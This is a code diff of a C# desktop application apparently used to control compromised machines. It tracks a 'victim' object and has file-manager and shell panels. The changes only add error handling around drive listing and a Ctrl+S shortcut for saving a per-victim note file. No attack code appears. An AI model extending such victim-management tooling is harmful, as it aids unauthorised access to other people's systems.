@@ -2259,26 +2259,38 @@ namespace Alien
             listView16.FullRowSelect = true;
             listView17.FullRowSelect = true;
 
-            var fileInit = await m_fileMgr.fnszInit();
-
             //Information
             m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
 
             //FileMgr
-            textBox1.Text = fileInit.szCurrentDir;
-            m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
-            foreach (string szName in fileInit.lsLogicalDrive)
+
+            var fileInit = new clsfnFileMgr.stInit();
+
+            try
             {
-                TreeNode node = new TreeNode(szName);
-                node.ImageKey = "harddrive";
-                treeView3.Nodes.Add(node);
+                fileInit = await m_fileMgr.fnszInit();
+
+                textBox1.Text = fileInit.szCurrentDir;
+                m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
+                foreach (string szName in fileInit.lsLogicalDrive)
+                {
+                    TreeNode node = new TreeNode(szName);
+                    node.ImageKey = "harddrive";
+                    treeView3.Nodes.Add(node);
+                }
+
+                fnFileAddPathToTreeView(fileInit.szCurrentDir);
+                treeView3.ExpandAll();
+
+                TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
+                treeView3.SelectedNode = cdNode;
             }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
 
-            fnFileAddPathToTreeView(fileInit.szCurrentDir);
-            treeView3.ExpandAll();
-
-            TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
-            treeView3.SelectedNode = cdNode;
+                return;
+            }
 
             //Shell
 
@@ -2580,6 +2592,25 @@ namespace Alien
                 textEditorControl1.TextChanged += (s, e) =>
                 {
                     toolStripStatusLabel7.Text = "Have not saved (Please save it before you close the control panel)";
+                };
+                textEditorControl1.ActiveTextAreaControl.TextArea.KeyDown += (s, e) =>
+                {
+                    if (e.Control && e.KeyCode == Keys.S)
+                    {
+                        e.Handled = true;
+
+                        try
+                        {
+                            string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
+                            File.WriteAllText(szFilePath, textEditorControl1.Text);
+
+                            toolStripStatusLabel7.Text = "Saved";
+                        }
+                        catch (Exception ex)
+                        {
+                            MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        }
+                    }
                 };
             }
             catch (Exception ex)
@@ -4018,6 +4049,8 @@ namespace Alien
             {
                 string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                 File.WriteAllText(szFilePath, textEditorControl1.Text);
+
+                toolStripStatusLabel7.Text = "Saved";
             }
             catch (Exception ex)
             {
@@ -4027,23 +4060,7 @@ namespace Alien
 
         private void textEditorControl1_KeyDown(object sender, KeyEventArgs e)
         {
-            if (e.Modifiers == Keys.Control)
-            {
-                if (e.Modifiers == Keys.S)
-                {
-                    try
-                    {
-                        string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
-                        File.WriteAllText(szFilePath, textEditorControl1.Text);
-
-                        toolStripStatusLabel7.Text = "Saved";
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    }
-                }
-            }
+            
         }
 
         private void toolStripButton13_Click(object sender, EventArgs e)
